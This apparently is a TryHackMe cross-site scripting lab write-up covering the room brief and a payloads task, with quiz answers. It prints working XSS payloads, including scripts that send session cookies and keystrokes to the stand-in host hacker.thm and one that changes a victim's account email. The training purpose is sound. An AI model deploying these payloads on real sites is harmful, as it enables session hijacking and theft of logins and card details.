---
title: TryHackMe - Cross-Site Scripting (XSS)
published: true
---

[https://tryhackme.com/room/xssgi](https://tryhackme.com/room/xssgi)

Learn how to detect and exploit XSS vulnerabilities, giving you control of other visitor's browsers.

## [](#header-3)Task 1 Room Brief

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.


Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.  

   - XSS found in Shopify
   - $7,500 for XSS found in Steam chat
   - $2,500 for XSS in HackerOne
   - XSS found in Infogram

**Answer the questions below**

What does XSS stand for? Cross-site Scripting

## [](#header-3)Task 2 XSS Payloads

**Proof Of Concept:**

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

``<script>alert('XSS');</script>``

**Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

``<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>``

**Key Logger:**

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

``<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>``

**Business Logic:**

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:

``<script>user.changeEmail('attacker@hacker.thm');</script>``

Now that the email address for the account has changed, the attacker may perform a reset password attack.

The next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.

**Answer the questions below**

Which document property could contain the user's session token? 

Checking [https://www.w3schools.com/js/js_htmldom_document.asp](https://www.w3schools.com/js/js_htmldom_document.asp) we can see the list of document properties. document.cookie is what we're looking for since this is for session tokens.

Which JavaScript method is often used as a Proof Of Concept?

From our first example "alert". We can use <script>alert('XSS');</script> to see if we can xss.

## [](#header-3)

